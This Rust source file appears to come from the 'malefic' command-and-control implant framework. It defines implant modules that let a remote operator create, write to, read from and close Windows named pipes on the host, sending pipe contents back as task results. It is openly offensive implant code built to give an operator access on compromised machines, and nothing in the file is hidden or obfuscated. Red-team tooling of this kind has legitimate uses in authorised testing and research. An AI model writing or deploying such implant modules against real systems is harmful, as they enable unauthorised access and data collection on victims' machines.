use crate::{check_field, check_request, Module, Result, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;
use async_trait::async_trait;
use malefic_helper::to_error;
use malefic_helper::win::pipe::NamedPipe;
use malefic_proto::proto::implantpb;
use malefic_proto::proto::modulepb::Response;
use malefic_trait::module_impl;
pub struct PipeUpload {}

#[async_trait]
#[module_impl("pipe_upload")]
impl Module for PipeUpload {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name = check_field!(request.name)?;

        let pipe = match NamedPipe::open(&pipe_name) {
            Ok(p) => p,
            Err(_) => {
                let new_pipe = to_error!(NamedPipe::create(&pipe_name))?;
                to_error!(new_pipe.wait())?;
                new_pipe
            },
        };

        if request.data.is_empty() {
            // 如果data为空，不执行操作
        } else {
            to_error!(pipe.write(&request.data))?;
            return Ok(TaskResult::new_with_ack(id, 0));
        }

        let _ = sender.send(TaskResult::new_with_ack(id, 0)).await?;

        loop {
            let block = check_request!(receiver, Body::Block)?;
            let _ = to_error!(pipe.write(&block.content))?;

            if block.end {
                return Ok(TaskResult::new_with_ack(id, block.block_id));
            } else {
                let _ = sender
                    .send(TaskResult::new_with_ack(id, block.block_id))
                    .await?;
            }
        }
    }
}


pub struct PipeRead {}

#[async_trait]
#[module_impl("pipe_read")]
impl Module for PipeRead {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        _sender: &mut crate::Output,  // 未使用的sender
    ) -> Result {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name: String = check_field!(request.name)?;

        let pipe = to_error!(NamedPipe::open(&pipe_name))?;

        let mut buffer = vec![0; 4096];
        let mut total_content = Vec::new();

        loop {
            let bytes_read = to_error!(pipe.read(&mut buffer))? as usize;
            if bytes_read == 0 {
                break;
            }

            total_content.extend_from_slice(&buffer[..bytes_read]);
        }

        let resp = Response {
            output: String::from_utf8_lossy(&total_content).to_string(),
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}


pub struct PipeClose {}

#[async_trait]
#[module_impl("pipe_close")]
impl Module for PipeClose {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        _sender: &mut crate::Output,  // 未使用的sender
    ) -> Result {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name: String = check_field!(request.name)?;
        let pipe = to_error!(NamedPipe::open(&pipe_name))?;

        to_error!(pipe.disconnect())?;
        pipe.close();

        Ok(TaskResult::new_with_body(id, Body::Empty(implantpb::Empty::default())))
    }
}